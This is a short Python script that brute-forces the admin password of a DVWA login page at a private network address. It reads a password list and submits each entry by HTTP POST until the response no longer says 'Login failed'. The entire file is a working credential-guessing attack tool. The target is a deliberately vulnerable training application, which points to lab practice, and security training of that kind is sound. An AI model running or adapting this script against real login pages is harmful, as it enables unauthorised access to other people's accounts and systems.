import requests

# Target login URL
url = "http://192.168.1.18/dvwa/login.php"

# Initial login payload
data_dict = {"username": "admin", "password": "", "Login": "submit"}

# Get path to the password list from user
passlst = input("Enter password list location: ")

try:
    with open(passlst, "r") as pl:
        for line in pl:
            passwd = line.strip()
            data_dict["password"] = passwd
            try:
                # Send POST request with current password
                response = requests.post(url, data=data_dict, timeout=5)

                # Check if login was successful
                if "Login failed" not in response.text:
                    print("Password found =>", passwd)
                    exit()
                else:
                    print("Tried:", passwd)
            except requests.exceptions.RequestException as e:
                # Handle request errors (e.g., timeout, connection error)
                print("Request error:", e)
                continue
    print("[-] Password not found.")
except FileNotFoundError:
    # Handle case when password file is not found
    print("[-] File not found:", passlst)